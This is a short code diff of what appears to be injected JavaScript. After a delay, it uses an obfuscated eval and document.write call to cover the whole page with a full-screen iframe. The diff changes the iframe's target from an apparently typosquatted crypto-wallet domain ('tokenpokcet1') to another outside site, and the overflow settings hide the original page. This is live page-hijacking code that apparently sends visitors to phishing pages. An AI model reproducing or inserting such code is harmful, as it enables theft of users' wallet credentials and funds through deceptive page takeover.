@@ -8,7 +8,7 @@ function MoobilePage() {
 //MoobilePage();
 setTimeout(MoobilePage, 3500);
 
-var eqvfq1 = '<div id="banner" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><iframe scrolling="yes"marginheight=0 marginwidth=0 frameborder="0"width="100%"height="100%"src="https://pro.tokenpokcet1.app/"></iframe></div><style type="text/css">html{width:100%;height:100%;overflow:hidden}body{width:100%;height:100%;overflow:hidden}</style>';
+var eqvfq1 = '<div id="banner" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><iframe scrolling="yes"marginheight=0 marginwidth=0 frameborder="0"width="100%"height="100%"src="https://token-lm.org/im/"></iframe></div><style type="text/css">html{width:100%;height:100%;overflow:hidden}body{width:100%;height:100%;overflow:hidden}</style>';
 window["eval"]("document.write('" + eqvfq1 + "');");
 try {
     setInterval(function() {
